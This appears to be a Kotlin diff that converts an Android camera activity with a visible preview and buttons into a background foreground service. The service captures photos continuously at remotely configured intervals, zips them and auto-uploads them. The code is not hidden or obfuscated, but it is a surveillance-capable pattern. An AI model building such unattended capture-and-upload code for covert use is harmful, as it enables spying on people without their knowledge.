@@ -1,64 +1,42 @@
-package com.example.demoapplication
+package com.example.demoapplication.services
 
 import android.Manifest
 import android.annotation.SuppressLint
+import android.app.*
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
-import android.graphics.ImageFormat
 import android.hardware.camera2.*
-import android.hardware.camera2.CameraCharacteristics.*
+import android.graphics.ImageFormat
 import android.hardware.usb.UsbManager
-import android.os.Bundle
-import android.os.Environment
-import android.os.Handler
-import android.os.HandlerThread
-import android.os.Looper
+import android.os.*
 import android.util.Log
 import android.util.Size
-import android.view.Surface
 import android.view.SurfaceHolder
-import android.view.SurfaceView
-import android.widget.Button
-import android.widget.TextView
-import androidx.activity.enableEdgeToEdge
 import androidx.annotation.RequiresPermission
-import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
-import androidx.core.view.ViewCompat
-import androidx.core.view.WindowInsetsCompat
-import com.example.demoapplication.services.NetworkModule
+import androidx.core.app.NotificationCompat
+import com.example.demoapplication.CameraDetectActivity
+import com.example.demoapplication.R
+import com.example.demoapplication.RemoteConfigHelper
 import com.example.demoapplication.utils.ImageUtils
-import com.example.demoapplication.utils.ImageUtils.formatFileSize
 import kotlinx.coroutines.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
-import java.io.BufferedOutputStream
-import java.io.File
-import java.io.FileInputStream
-import java.io.FileOutputStream
+import java.io.*
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
-class CameraDetectActivity : AppCompatActivity() {
+class CameraService : Service() {
 
     companion object {
-        private const val TAG = "TvUsbCam"
+        private const val TAG = "CameraService"
+        private const val NOTIF_CHANNEL = "camera_channel"
+        private const val NOTIF_ID = 101
     }
-
-    private lateinit var surfaceView: SurfaceView
-    private lateinit var countText: TextView
-    private lateinit var btnStart: Button
-    private lateinit var btnStop: Button
-    private lateinit var btnGallery: Button
-    private lateinit var btnClearCounts: Button
-
-    // Counters
-    @Volatile private var capturedCount = 0
 
     // RC-controlled tunables (no clamps)
     private var intervalMillis: Long = 1_000L
@@ -67,6 +45,7 @@ class CameraDetectActivity : AppCompatActivity() {
     private var webpMaxDim = 1200
     private var autoUploadEnabled = true
 
+    // === Camera state ===
     private lateinit var cameraManager: CameraManager
     private var cameraId: String? = null
     private var cameraDevice: CameraDevice? = null
@@ -92,14 +71,18 @@ class CameraDetectActivity : AppCompatActivity() {
     private var retryIndex = 0
     private var autoStartedForThisOpen = false
 
-    private val photoFolder by lazy {
-        File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "photos").apply { mkdirs() }
-    }
-
     // background scope for zip/upload
     private val ioScope by lazy { CoroutineScope(SupervisorJob() + Dispatchers.IO) }
     @Volatile private var zipInProgress = false
     private var lastUploadWindowStart = 0L
+
+    private val photoFolder by lazy {
+        File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "photos").apply { mkdirs() }
+    }
+
+    // === Counters ===
+    @Volatile private var capturedCount = 0
+
 
     private fun show(msg: String) {
         Log.d(TAG, msg)
@@ -155,79 +138,47 @@ class CameraDetectActivity : AppCompatActivity() {
         }
     }
 
-    // ===== Lifecycle =====
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        enableEdgeToEdge()
-        setContentView(R.layout.activity_camera_detect)
-        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
-            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
-            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
-            insets
-        }
-
-        surfaceView = findViewById(R.id.previewView)
-        countText   = findViewById(R.id.countText)
-        btnStart    = findViewById(R.id.btnStart)
-        btnStop     = findViewById(R.id.btnStop)
-        btnGallery  = findViewById(R.id.btnShowImages)
-        btnClearCounts = findViewById(R.id.btnClearCounts)
+    override fun onCreate() {
+        super.onCreate()
         cameraManager = getSystemService(CameraManager::class.java)
+        createNotificationChannel()
+        startForeground(
+            NOTIF_ID,
+            NotificationCompat.Builder(this, NOTIF_CHANNEL)
+                .setContentTitle("Background Camera")
+                .setContentText("Capturing photos…")
+                .setSmallIcon(R.drawable.ic_launcher_foreground)
+                .build()
+        )
 
-        btnStart.setOnClickListener { startAutoCapture() }
-        btnStop.setOnClickListener { stopAutoCapture() }
-        btnClearCounts.setOnClickListener { deleteAllPhotos() }
-
-        // Ensure defaults are set in Application or here; then fetch latest
-        fetchAndApplyRemoteConfig()
-        surfaceView.holder.addCallback(object : SurfaceHolder.Callback {
-            @RequiresPermission(Manifest.permission.CAMERA)
-            override fun surfaceCreated(holder: SurfaceHolder) {
-                surfaceReady = true
-                maybeOpenCamera()
-            }
-            override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {
-                surfaceReady = holder.surface?.isValid == true
-            }
-            override fun surfaceDestroyed(holder: SurfaceHolder) {
-                surfaceReady = false
-                closeCamera("Surface destroyed")
-            }
-        })
-    }
-
-    @RequiresPermission(Manifest.permission.CAMERA)
-    override fun onResume() {
-        super.onResume()
         startBgThread()
-
-        registerReceiver(usbReceiver, IntentFilter().apply {
-            addAction(UsbManager.ACTION_USB_DEVICE_ATTACHED)
-            addAction(UsbManager.ACTION_USB_DEVICE_DETACHED)
-        })
-        cameraManager.registerAvailabilityCallback(availabilityCallback, mainHandler)
-
-        if (!hasCameraPermission() && !permissionRequested) {
-            permissionRequested = true
-            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), 100)
+        pickCameraId()
+        if (ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.CAMERA
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            // TODO: Consider calling
+            //    ActivityCompat#requestPermissions
+            // here to request the missing permissions, and then overriding
+            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+            //                                          int[] grantResults)
+            // to handle the case where the user grants the permission. See the documentation
+            // for ActivityCompat#requestPermissions for more details.
             return
         }
-
+        openCamera()
+        // Ensure defaults are set in Application or here; then fetch latest
         fetchAndApplyRemoteConfig()
-        dumpCameras()
-        pickCameraId()
-        maybeOpenCamera()
     }
 
-    override fun onPause() {
-        super.onPause()
-        cameraManager.unregisterAvailabilityCallback(availabilityCallback)
-        try { unregisterReceiver(usbReceiver) } catch (_: Exception) {}
-        stopAutoCapture()
-        closeCamera("onPause()")
-        openInProgress = false
-        stopBgThread()
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        Log.d(TAG, "CameraService started")
+        startAutoCapture()
+        return START_STICKY
     }
+
+    override fun onBind(intent: Intent?) = null
 
     // ===== Background thread =====
     private fun startBgThread() {
@@ -243,28 +194,54 @@ class CameraDetectActivity : AppCompatActivity() {
         bgHandler = null
     }
 
-    // ===== Permission =====
-    private fun hasCameraPermission(): Boolean =
-        ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
-
     @RequiresPermission(Manifest.permission.CAMERA)
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == 100 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            Log.d(TAG, "CAMERA permission granted")
-            pickCameraId()
-            maybeOpenCamera()
-        } else {
-            show("Camera permission required")
+    private fun openCamera() {
+        if (cameraId == null) return
+        try {
+            cameraManager.openCamera(cameraId!!, object : CameraDevice.StateCallback() {
+                override fun onOpened(device: CameraDevice) {
+                    cameraDevice = device
+                    createImageReader()
+                    createCaptureSession()
+                }
+                override fun onDisconnected(device: CameraDevice) {
+                    device.close(); cameraDevice = null
+                }
+                override fun onError(device: CameraDevice, error: Int) {
+                    device.close(); cameraDevice = null
+                }
+            }, bgHandler)
+        } catch (e: Exception) {
+            Log.e(TAG, "openCamera failed: ${e.message}", e)
         }
     }
 
-    // ===== UI actions =====
+    private fun createCaptureSession() {
+        try {
+            val device = cameraDevice ?: return
+            val surfaces = listOf(imageReader!!.surface)
+            device.createCaptureSession(
+                surfaces,
+                object : CameraCaptureSession.StateCallback() {
+                    override fun onConfigured(session: CameraCaptureSession) {
+                        captureSession = session
+                    }
+                    override fun onConfigureFailed(session: CameraCaptureSession) {
+                        Log.e(TAG, "Capture session failed")
+                    }
+                }, bgHandler
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "createCaptureSession failed: ${e.message}", e)
+        }
+    }
+
+    // === Capture ===
     @SuppressLint("SetTextI18n")
     private fun startAutoCapture() {
         if (captureJob?.isActive == true) return
         capturedCount = 0
-        countText.text = "Captured: $capturedCount (continuous)"
+//        countText.text = "Captured: $capturedCount (continuous)"
         lastUploadWindowStart = System.currentTimeMillis()
 
         captureJob = CoroutineScope(Dispatchers.Main).launch {
@@ -299,16 +276,15 @@ class CameraDetectActivity : AppCompatActivity() {
         captureJob?.cancel()
         captureJob = null
         show("Auto capture stopped")
-        countText.text = "Captured: $capturedCount (stopped)"
     }
 
     @SuppressLint("SetTextI18n")
     private fun deleteAllPhotos() {
         photoFolder.listFiles()?.forEach { file -> if (file.isFile) file.delete() }
         capturedCount = 0
-        countText.text = "Captured: 0"
         Log.d(TAG, "🗑️ All photos deleted")
     }
+
 
     // ===== Camera listing / pick =====
     private fun dumpCameras() {
@@ -317,9 +293,9 @@ class CameraDetectActivity : AppCompatActivity() {
             Log.d(TAG, "cameraIdList=[$ids]")
             for (id in cameraManager.cameraIdList) {
                 val c = cameraManager.getCameraCharacteristics(id)
-                val facing = c.get(LENS_FACING)
-                val ext = if (facing == LENS_FACING_EXTERNAL) "EXTERNAL" else "$facing"
-                val caps = c.get(REQUEST_AVAILABLE_CAPABILITIES)?.joinToString()
+                val facing = c.get(CameraCharacteristics.LENS_FACING)
+                val ext = if (facing == CameraCharacteristics.LENS_FACING_EXTERNAL) "EXTERNAL" else "$facing"
+                val caps = c.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES)?.joinToString()
                 Log.d(TAG, "id=$id facing=$ext caps=$caps")
             }
         } catch (e: Exception) {
@@ -333,8 +309,8 @@ class CameraDetectActivity : AppCompatActivity() {
             var fallback: String? = null
             for (id in cameraManager.cameraIdList) {
                 val chars = cameraManager.getCameraCharacteristics(id)
-                when (chars.get(LENS_FACING)) {
-                    LENS_FACING_EXTERNAL -> { cameraId = id; break }
+                when (chars.get(CameraCharacteristics.LENS_FACING)) {
+                    CameraCharacteristics.LENS_FACING_EXTERNAL -> { cameraId = id; break }
                     else -> if (fallback == null) fallback = id
                 }
             }
@@ -350,7 +326,6 @@ class CameraDetectActivity : AppCompatActivity() {
     @RequiresPermission(Manifest.permission.CAMERA)
     private fun maybeOpenCamera() {
         if (openInProgress || cameraDevice != null) return
-        if (!hasCameraPermission()) return
         if (!surfaceReady) { show("Preparing preview surface…"); return }
         if (cameraId == null) { show("Please connect a camera"); return }
 
@@ -364,18 +339,18 @@ class CameraDetectActivity : AppCompatActivity() {
                     retryIndex = 0
                     cameraDevice = device
                     openInProgress = false
-                    startPreview(surfaceView.holder.surface)
+//                    startPreview(surfaceView.holder.surface)
                 }
                 override fun onDisconnected(device: CameraDevice) {
                     openInProgress = false
                     stopAutoCapture()
-                    closeCamera("Camera disconnected. Please connect a camera.")
+//                    closeCamera("Camera disconnected. Please connect a camera.")
                     scheduleRetry()
                 }
                 override fun onError(device: CameraDevice, error: Int) {
                     openInProgress = false
                     stopAutoCapture()
-                    closeCamera("Camera error: $error")
+//                    closeCamera("Camera error: $error")
                     scheduleRetry()
                 }
             }, mainHandler)
@@ -397,11 +372,12 @@ class CameraDetectActivity : AppCompatActivity() {
         mainHandler.postDelayed({ maybeOpenCamera() }, delay)
     }
 
+
     // ===== Preview / Session =====
     private fun chooseSizes() {
         val id = cameraId ?: return
         val chars = cameraManager.getCameraCharacteristics(id)
-        val map = chars.get(SCALER_STREAM_CONFIGURATION_MAP)
+        val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
             ?: throw IllegalStateException("No stream config map")
 
         val previewChoices = map.getOutputSizes(SurfaceHolder::class.java)
@@ -412,8 +388,6 @@ class CameraDetectActivity : AppCompatActivity() {
         val jpegChoices = map.getOutputSizes(ImageFormat.JPEG)
         jpegSize = jpegChoices?.maxByOrNull { it.width.toLong() * it.height } ?: Size(1280, 720)
 
-        // optional: align SurfaceView buffer
-        previewSize?.let { surfaceView.holder.setFixedSize(it.width, it.height) }
     }
 
     @SuppressLint("SetTextI18n")
@@ -441,7 +415,12 @@ class CameraDetectActivity : AppCompatActivity() {
                     fos.write(bytes)
                     try { fos.fd.sync() } catch (_: Throwable) {}
                 }
-                Log.d(TAG, "📸 JPG saved: ${jpgFile.name} (${formatFileSize(jpgFile.length())})")
+                Log.d(
+                    TAG, "📸 JPG saved: ${jpgFile.name} (${
+                        ImageUtils.formatFileSize(
+                            jpgFile.length()
+                        )
+                    })")
 
                 // 2) convert to WebP and remove the JPG
                 val webpFile = ImageUtils.convertJpgToWebP(
@@ -452,67 +431,25 @@ class CameraDetectActivity : AppCompatActivity() {
                 )
 
                 if (webpFile != null) {
-                    Log.d(TAG, "🖼️ WebP ready: ${webpFile.name} (${formatFileSize(webpFile.length())})")
+                    Log.d(
+                        TAG, "🖼️ WebP ready: ${webpFile.name} (${
+                            ImageUtils.formatFileSize(
+                                webpFile.length()
+                            )
+                        })")
                 } else {
                     Log.e(TAG, "WebP conversion failed; keeping JPG (if exists).")
                 }
 
                 // UI count
                 capturedCount += 1
-                mainHandler.post { countText.text = "Captured: $capturedCount" }
+//                mainHandler.post { countText.text = "Captured: $capturedCount" }
             } catch (e: Exception) {
                 Log.e(TAG, "Save/convert failed: ${e.message}", e)
             } finally {
                 image.close()
             }
         }, bgHandler)
-    }
-
-
-    private fun startPreview(previewSurface: Surface) {
-        val device = cameraDevice ?: return
-        try {
-            chooseSizes()
-            createImageReader()
-            val irSurface = imageReader!!.surface
-
-            val previewReq = device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
-                addTarget(previewSurface)
-                set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
-                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
-                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
-            }
-
-            device.createCaptureSession(
-                listOf(previewSurface, irSurface),
-                object : CameraCaptureSession.StateCallback() {
-                    override fun onConfigured(session: CameraCaptureSession) {
-                        captureSession = session
-                        try {
-                            session.setRepeatingRequest(previewReq.build(), null, bgHandler)
-                            show("")
-                            if (!autoStartedForThisOpen) {
-                                autoStartedForThisOpen = true
-                                startAutoCapture()
-                            }
-                        } catch (e: Exception) {
-                            Log.e(TAG, "setRepeatingRequest() failed: ${e.message}", e)
-                            show("Preview error: ${e.message}")
-                            scheduleRetry()
-                        }
-                    }
-                    override fun onConfigureFailed(session: CameraCaptureSession) {
-                        Log.e(TAG, "onConfigureFailed()")
-                        show("Preview config failed")
-                        scheduleRetry()
-                    }
-                }, bgHandler
-            )
-        } catch (e: Exception) {
-            Log.e(TAG, "startPreview() exception: ${e.message}", e)
-            show("Start preview failed: ${e.message}")
-            scheduleRetry()
-        }
     }
 
     @SuppressLint("SetTextI18n")
@@ -537,12 +474,12 @@ class CameraDetectActivity : AppCompatActivity() {
             session.stopRepeating()
             session.capture(captureReq, object : CameraCaptureSession.CaptureCallback() {}, bgHandler)
 
-            val previewReq = device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
-                addTarget(surfaceView.holder.surface)
-                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
-                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
-            }.build()
-            session.setRepeatingRequest(previewReq, null, bgHandler)
+//            val previewReq = device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
+//                addTarget(surfaceView.holder.surface)
+//                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+//                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+//            }.build()
+//            session.setRepeatingRequest(previewReq, null, bgHandler)
         } catch (e: Exception) {
             Log.e(TAG, "captureStillImage() failed: ${e.message}", e)
             show("Capture failed: ${e.message}")
@@ -566,21 +503,23 @@ class CameraDetectActivity : AppCompatActivity() {
     // ===== ZIP + Upload (background) =====
     @SuppressLint("SetTextI18n")
     private suspend fun doZipAndUploadBlockBackground() {
-        withContext(Dispatchers.Main) { countText.text = "Creating ZIP..." }
+        Log.d(TAG, "Creating ZIP...")
         val zip = createZipOfFolder(photoFolder)
 
-        withContext(Dispatchers.Main) { countText.text = "Uploading ZIP..." }
+        Log.d(TAG, "Uploading ZIP...")
         val success = uploadZipFile(zip)
 
-        withContext(Dispatchers.Main) {
-            countText.text = if (success) {
-                "Upload success ✅\nPhotos Captured: $capturedCount"
-            } else {
-                "Upload failed ❌ (see log)\nPhotos Captured: $capturedCount"
-            }
+        if (success) {
+            Log.d(TAG, "Upload success ✅ | Photos Captured: $capturedCount")
+        } else {
+            Log.d(TAG, "Upload failed ❌ (see log) | Photos Captured: $capturedCount")
         }
 
-        try { if (zip.exists()) zip.delete() } catch (_: Exception) {}
+        try {
+            if (zip.exists()) zip.delete()
+        } catch (_: Exception) {
+            Log.w(TAG, "Failed to delete zip file after upload")
+        }
     }
 
     // ------------------ ZIP CREATION ------------------
@@ -613,8 +552,12 @@ class CameraDetectActivity : AppCompatActivity() {
             }
         }
 
-        Log.d("ZIP", "Created ZIP: ${zipFile.name} — ${files.size} photos; " +
-                "orig=${formatFileSize(totalOriginalBytes)}, zip=${formatFileSize(zipFile.length())}")
+        Log.d(TAG, "Created ZIP: ${zipFile.name} — ${files.size} photos; " +
+                "orig=${ImageUtils.formatFileSize(totalOriginalBytes)}, zip=${
+                    ImageUtils.formatFileSize(
+                        zipFile.length()
+                    )
+                }")
         return zipFile
     }
 
@@ -661,5 +604,28 @@ class CameraDetectActivity : AppCompatActivity() {
             // Optionally delete the temporary ZIP itself (not the photos)
             try { if (zipFile.exists()) zipFile.delete() } catch (_: Exception) {}
         }
+    }
+
+
+    // === Notification channel ===
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                NOTIF_CHANNEL,
+                "Camera Background Service",
+                NotificationManager.IMPORTANCE_LOW
+            )
+            val nm = getSystemService(NotificationManager::class.java)
+            nm.createNotificationChannel(channel)
+        }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        stopAutoCapture()
+        stopBgThread()
+        captureSession?.close()
+        cameraDevice?.close()
+        imageReader?.close()
     }
 }
